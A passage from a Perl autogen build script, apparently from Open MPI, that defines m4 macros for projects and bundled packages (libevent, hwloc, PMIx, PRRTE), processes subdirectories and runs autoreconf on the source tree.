push(@{$projects}, { name => "ompi", dir => "ompi", need_base => 1 });
push(@{$projects}, { name => "oshmem", dir => "oshmem", need_base => 1 });

$m4 .= "dnl Separate m4 define for each project\n";
foreach my $p (@$projects) {
    $m4 .= "m4_define([project_$p->{name}], [1])\n";
}

$m4 .= "\ndnl Project names
m4_define([project_name_long], [$project_name_long])
m4_define([project_name_short], [$project_name_short])\n";

# Setup MCA
mca_run_global($projects);

#---------------------------------------------------------------------------

# Handle 3rd-party packages
++$step;
verbose "\n$step. Setup for 3rd-party packages\n";

$m4 .= "\n$dnl_line
$dnl_line
$dnl_line

dnl 3rd-party package information\n";

# Extract the OMPI options to exclude them when processing PMIx and PRRTE
if ( ! (list_contains("pmix", @disabled_3rdparty_packages) &&
	list_contains("prrte", @disabled_3rdparty_packages))) {
    safe_system("./config/extract-3rd-party-configure.pl -p . -n \"OMPI\" -l > config/auto-generated-ompi-exclude.ini");
}

# these are fairly one-off, so we did not try to do anything
# generic. Sorry :).

verbose "=== Libevent\n";
if (list_contains("libevent", @disabled_3rdparty_packages)) {
    verbose "--- Libevent disabled\n";
} else {
    my $libevent_directory = "libevent-" . $libevent_version;
    my $libevent_tarball = $libevent_directory . ".tar.gz";
    if (! -f "3rd-party/" . $libevent_tarball) {
        my_die("Could not find libevent tarball\n");
    }
    $m4 .= "m4_define([package_libevent], [1])\n";
    $m4 .= "m4_define([libevent_tarball], [" . $libevent_tarball . "])\n";
    $m4 .= "m4_define([libevent_directory], [" . $libevent_directory . "])\n";
    verbose "--- Libevent enabled (" . $libevent_version . ")\n";
}

verbose "=== hwloc\n";
if (list_contains("hwloc", @disabled_3rdparty_packages)) {
    verbose "--- hwloc disabled\n";
} else {
    my $hwloc_directory = "hwloc-" . $hwloc_version;
    my $hwloc_tarball = $hwloc_directory . ".tar.gz";
    if (! -f "3rd-party/" . $hwloc_tarball) {
        my_die("Could not find hwloc tarball\n");
    }
    $m4 .= "m4_define([package_hwloc], [1])\n";
    $m4 .= "m4_define([hwloc_tarball], [" . $hwloc_tarball . "])\n";
    $m4 .= "m4_define([hwloc_directory], [" . $hwloc_directory . "])\n";
    verbose "--- hwloc enabled (" . $hwloc_version . ")\n";
}

verbose "=== PMIx\n";
if (list_contains("pmix", @disabled_3rdparty_packages)) {
    verbose "--- PMIx disabled\n";
} else {
    # sanity check pmix files exist
    if (! -f "3rd-party/openpmix/configure.ac") {
        my_die("Could not find pmix files\n");
    }
    push(@subdirs, "3rd-party/openpmix/");
    $m4 .= "m4_define([package_pmix], [1])\n";

    # Grab the unique configure options from each of the 3rd party packages
    safe_system("./config/extract-3rd-party-configure.pl -p \"3rd-party/openpmix/\" -n \"PMIx\" -e config/auto-generated-ompi-exclude.ini > config/auto-extracted-pmix-configure-args.m4");
    # Add the additional configure options from PMIx
    safe_system("./config/extract-3rd-party-configure.pl -p \"3rd-party/openpmix/\" -n \"PMIx\" -l >> config/auto-generated-ompi-exclude.ini");

    verbose "--- PMIx enabled\n";
}

verbose "=== PRRTE\n";
if (list_contains("prrte", @disabled_3rdparty_packages)) {
    verbose "--- PRRTE disabled\n";
} else {
    # sanity check prrte files exist
    if (! -f "3rd-party/prrte/configure.ac") {
        my_die("Could not find pmix files\n");
    }
    push(@subdirs, "3rd-party/prrte/");
    $m4 .= "m4_define([package_prrte], [1])\n";

    # Grab the unique configure options from each of the 3rd party packages
    safe_system("./config/extract-3rd-party-configure.pl -p \"3rd-party/prrte/\" -n \"PRRTE\" -e config/auto-generated-ompi-exclude.ini > config/auto-extracted-prrte-configure-args.m4");

    verbose "--- PRRTE enabled\n";
}

$m4 .= "\n";

process_autogen_subdirs("3rd-party");

#---------------------------------------------------------------------------

# Find MPI extensions
++$step;
verbose "\n$step. Searching for Open MPI extensions\n\n";
mpiext_run_global("ompi/mpiext");

#---------------------------------------------------------------------------

# Process all subdirs that we found in previous steps
++$step;
verbose "\n$step. Processing autogen.subdirs directories\n";

if ($#subdirs >= 0) {
    foreach my $d (@subdirs) {
        process_subdir($d);
    }
} else {
    print "<none found>\n";
}

#---------------------------------------------------------------------------

# If we got here, all was good.  Run the auto tools.
++$step;
verbose "\n$step. Running autotools on top-level tree\n\n";

# Remove old versions of the files (this is probably overkill, but...)
verbose "==> Remove stale files\n";
find_and_delete(qw/config.guess config.sub depcomp compile install-sh ltconfig
    ltmain.sh missing mkinstalldirs libtool/);

# Remove the old m4 file and write the new one
verbose "==> Writing m4 file with autogen.pl results\n";
unlink($m4_output_file);
open(M4, ">$m4_output_file") ||
    my_die "Can't open $m4_output_file";
print M4 $m4;
close(M4);

# Generate the version checking script with autom4te
verbose "==> Generating opal_get_version.sh\n";
chdir("config");
safe_system("autom4te --language=m4sh opal_get_version.m4sh -o opal_get_version.sh");

# Run autoreconf
verbose "==> Running autoreconf\n";
chdir("..");
my $cmd = "autoreconf -ivf --warnings=all,no-obsolete,no-override -I config -I config/oac";
foreach my $project (@{$projects}) {
    $cmd .= " -I $project->{dir}/config"
        if (-d "$project->{dir}/config");
}
safe_system($cmd);

patch_autotools_output(".");

# Per https://github.com/open-mpi/ompi/issues/8410, replace config.sub
# and config.guess with known-good versions if the Autoconf-installed
# versions are older.
replace_config_sub_guess(".");

#---------------------------------------------------------------------------

verbose "
================================================
Open MPI autogen: completed successfully.  w00t!
================================================\n\n";

# Done!
exit(0);
